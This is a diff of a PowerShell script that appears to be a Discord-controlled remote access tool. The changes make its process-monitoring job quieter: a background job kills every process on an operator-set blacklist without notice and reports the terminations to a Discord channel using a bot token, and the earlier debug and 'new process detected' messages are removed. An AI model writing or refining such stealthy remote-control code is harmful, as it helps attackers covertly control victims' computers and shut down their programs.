@@ -263,12 +263,6 @@ function MStart_ProcessMonitoring {
         return
     }
     
-    # Debug: Show current blacklist state
-    sendMsg -Message ":information_source: **Debug - Current blacklist count:** $($global:ProcessBlacklist.Count)"
-    if ($global:ProcessBlacklist.Count -gt 0) {
-        sendMsg -Message ":information_source: **Debug - Blacklist contents:** $($global:ProcessBlacklist -join ', ')"
-    }
-    
     if ($global:ProcessBlacklist.Count -eq 0) {
         sendMsg -Message ":warning: **No processes in blacklist.** Add some first with ``ADDBLACKLIST``"
         return
@@ -277,8 +271,8 @@ function MStart_ProcessMonitoring {
     try {
         $global:ProcessMonitoringEnabled = $true
         
-        sendMsg -Message ":eye: **Starting process monitoring** with $intervalSeconds second interval..."
-        sendMsg -Message ":information_source: **Blacklisted processes:** $($global:ProcessBlacklist -join ', ')"
+        sendMsg -Message ":eye: **Process monitoring started** with $intervalSeconds second interval - Silent mode (only blacklist terminations will be reported)"
+        sendMsg -Message ":information_source: **Monitoring blacklisted processes:** $($global:ProcessBlacklist -join ', ')"
         
         $global:ProcessMonitorJob = Start-Job -ScriptBlock {
             param($token, $SessionID, $intervalSeconds, $blacklist)
@@ -297,14 +291,6 @@ function MStart_ProcessMonitoring {
             ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
             
             $knownProcesses = @{}
-            
-            # Send initial status message
-            try {
-                sendMsg -Message ":eye: **Process monitoring job started successfully**"
-                sendMsg -Message ":information_source: **Job monitoring these blacklisted processes:** $($blacklist -join ', ')"
-            } catch {
-                # If sendMsg fails, continue silently
-            }
             
             while ($true) {
                 try {
@@ -326,11 +312,12 @@ function MStart_ProcessMonitoring {
                                 }
                             }
                             
+                            # ONLY send messages for blacklisted processes
                             if ($isBlacklisted) {
                                 try {
                                     $proc.Kill()
                                     try {
-                                        sendMsg -Message ":skull_crossbones: **Blacklisted process terminated:** $($proc.ProcessName) (PID: $($proc.Id))"
+                                        sendMsg -Message ":skull_crossbones: **BLACKLISTED PROCESS TERMINATED:** $($proc.ProcessName) (PID: $($proc.Id))"
                                     } catch {
                                         # Silent fail if Discord message fails
                                     }
@@ -341,21 +328,8 @@ function MStart_ProcessMonitoring {
                                         # Silent fail if Discord message fails
                                     }
                                 }
-                            } else {
-                                # Only report significant processes to avoid spam
-                                if ($proc.ProcessName -notlike "svchost*" -and 
-                                    $proc.ProcessName -notlike "System*" -and 
-                                    $proc.ProcessName -ne "Idle" -and
-                                    $proc.ProcessName -notlike "dwm" -and
-                                    $proc.ProcessName -notlike "winlogon" -and
-                                    $proc.ProcessName -notlike "csrss") {
-                                    try {
-                                        sendMsg -Message ":new: **New process detected:** $($proc.ProcessName) (PID: $($proc.Id))"
-                                    } catch {
-                                        # Silent fail if Discord message fails
-                                    }
-                                }
                             }
+                            # Removed the else block that was sending "New process detected" messages
                         }
                     }
                     
@@ -382,7 +356,7 @@ function MStart_ProcessMonitoring {
         # Wait for job to initialize
         Start-Sleep -Seconds 1
         
-        sendMsg -Message ":eye: **Process monitoring started successfully** (Job ID: $($global:ProcessMonitorJob.Id)) - Blacklisted processes will be terminated automatically"
+        sendMsg -Message ":eye: **Process monitoring active** (Job ID: $($global:ProcessMonitorJob.Id)) - Blacklisted processes will be terminated silently"
         
     } catch {
         $global:ProcessMonitoringEnabled = $false
@@ -416,7 +390,7 @@ function MGet_ProcessMonitoringStatus {
     if ($global:ProcessMonitoringEnabled -and $global:ProcessMonitorJob) {
         $job = $global:ProcessMonitorJob
         if ($job.State -eq "Running") {
-            sendMsg -Message ":eye: **Process Monitoring Status:** Running (Job ID: $($job.Id))"
+            sendMsg -Message ":eye: **Process Monitoring Status:** Running (Job ID: $($job.Id)) - Silent mode"
             sendMsg -Message ":information_source: **Blacklisted processes:** $($global:ProcessBlacklist -join ', ')"
         } else {
             sendMsg -Message ":eye: **Process Monitoring Status:** Job exists but not running (State: $($job.State))"
